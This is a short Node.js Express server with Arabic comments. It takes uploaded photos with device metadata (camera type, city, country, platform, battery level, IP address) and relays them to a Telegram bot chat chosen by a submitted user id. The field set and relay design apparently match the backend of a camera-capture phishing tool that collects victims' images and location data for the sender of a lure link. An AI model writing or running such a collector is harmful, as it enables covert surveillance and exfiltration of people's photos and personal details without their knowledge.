const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// إعداد multer للتعامل مع رفع الملفات
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// مسار لاستقبال الصور
app.post('/submitPhotos', upload.single('images'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ success: false, error: 'No image provided' });
    }

    const { userId, cameraType, imageWidth, imageHeight, additionalData } = req.body;
    
    // تحليل البيانات الإضافية
    let additionalInfo = {};
    try {
      additionalInfo = JSON.parse(additionalData);
    } catch (e) {
      console.error('Error parsing additional data:', e);
    }

    // إعداد الرسالة للنص
    const message = `
📸 تم استلام صورة جديدة
👤 معرّف المستخدم: ${userId}
📷 نوع الكاميرا: ${cameraType}
📐 أبعاد الصورة: ${imageWidth} x ${imageHeight}
🌍 البلد: ${additionalInfo.country || 'غير معروف'}
🏙️ المدينة: ${additionalInfo.city || 'غير معروف'}
💻 النظام: ${additionalInfo.platform || 'غير معروف'}
🔋 مستوى البطارية: ${additionalInfo.batteryLevel ? (additionalInfo.batteryLevel * 100).toFixed(0) + '%' : 'غير معروف'}
⚡ حالة الشحن: ${additionalInfo.batteryCharging ? 'يشحن' : 'لا يشحن'}
📡 عنوان IP: ${additionalInfo.ip || 'غير معروف'}
    `.trim();

    // إرسال الصورة والنص إلى البوت
    try {
      // إنشاء FormData لإرسال الصورة
      const formData = new FormData();
      formData.append('chat_id', userId); // استخدام userId كمعرف المحادثة
      formData.append('photo', req.file.buffer, {
        filename: `photo_${cameraType}_${Date.now()}.webp`,
        contentType: req.file.mimetype
      });
      formData.append('caption', message);

      // إرسال الصورة إلى التيليجرام
      const response = await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`, formData, {
        headers: formData.getHeaders()
      });

      console.log('Photo sent to Telegram successfully');
      res.json({ success: true, message: 'Photo sent successfully' });
    } catch (error) {
      console.error('Error sending to Telegram:', error.response?.data || error.message);
      res.status(500).json({ success: false, error: 'Failed to send photo to Telegram' });
    }
  } catch (error) {
    console.error('Error processing request:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// بدء الخادم
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
